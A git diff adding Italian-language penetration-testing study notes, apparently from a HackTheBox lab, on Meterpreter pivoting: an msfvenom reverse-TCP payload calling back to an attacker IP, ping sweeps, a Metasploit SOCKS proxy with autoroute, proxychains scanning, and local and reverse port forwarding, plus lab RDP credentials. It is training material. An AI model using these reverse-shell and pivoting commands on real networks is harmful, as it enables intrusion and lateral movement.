@@ -201,3 +201,87 @@ QUindi come LHOST metteremo non il nostro IP ma quello del pivot
 `j4k1dibe@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN`
 
 Se ci eravamo messi in ascolto sulla macchina principale cosi' riceviamo una shell.
+
+
+# Meterpreter Tunneling & Port Forwarding
+
+Consideriamo lo scenario dove la nostra shell di meterpreter ha accesso al pivot host.
+
+### Creating payload for pivot
+
+`j4k1dibe@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080`
+
+`msf6 > use exploit/multi/handler` settiamo handler 
+
+### Ping Sweep
+dentro la sessione meterpreter possiamo runnare questo modulo metasploit per vedere dentro la rete e pingare gli host
+
+`meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`
+
+`for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done` Ping sweep in linux
+
+`for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"` Ping sweep in CMD
+
+`1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}` Ping sweep in PowerShell
+
+
+### Configuriamo un MSF's SOCKS Proxy
+```
+msf6 > use auxiliary/server/socks_proxy
+
+msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
+SRVPORT => 9050
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
+SRVHOST => 0.0.0.0
+msf6 auxiliary(server/socks_proxy) > set version 4a
+version => 4a
+msf6 auxiliary(server/socks_proxy) > run
+[*] Auxiliary module running as background job 0.
+```
+
+`socks4 	127.0.0.1 9050` Aggiungiamo questa line in fondo a /etc/proxychains.conf
+
+### Creating Routes with AutoRoute
+
+Ora possiamo dire al nostro socks_proxy module di routare tutto il traffico tramite la nostra sessione di meterpreter usando **pust/multi/manage/autoroute** per aggiungere route per la subnet.
+
+```
+msf6 > use post/multi/manage/autoroute
+
+msf6 post(multi/manage/autoroute) > set SESSION 1
+SESSION => 1
+msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
+SUBNET => 172.16.5.0
+msf6 post(multi/manage/autoroute) > run
+```
+
+`meterpreter > run autoroute -s 172.16.5.0/23`. piu' semplice
+
+### Listing active routes with autoroutes
+`meterpreter > run autoroute -p`
+
+### Testing Porxy & Routing Functionality
+`j4k1dibe@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn`
+
+## Port Forwarding with MSF
+
+`meterpreter > help portfwd`
+
+### Create a local TCP relay
+Praticamente starta un listener nella porta 3300 nel nostro attack host e forwarda tutto i pacchetti al server remoto sulla porta 3389
+
+`meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19` 
+
+Ora possiamo tipo anche eseguire xfreerdp sul nostro localhost porta 3300
+
+`j4k1dibe@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123`
+
+`j4k1dibe@htb[/htb]$ netstat -antp`, per vedere info sulle robe fatte
+
+## MEterpreter Reverse Port Forwarding
+
+Metasploit puo' anche fare reverse port forwarding. quindi si ascolta su una porta sul server compromesso e forwarda tutto al pivot server
+
+`meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18`. -l e' la porta sul nostro host attaccante
+
+Poi ci mettiamo in ascolto con meterpreter
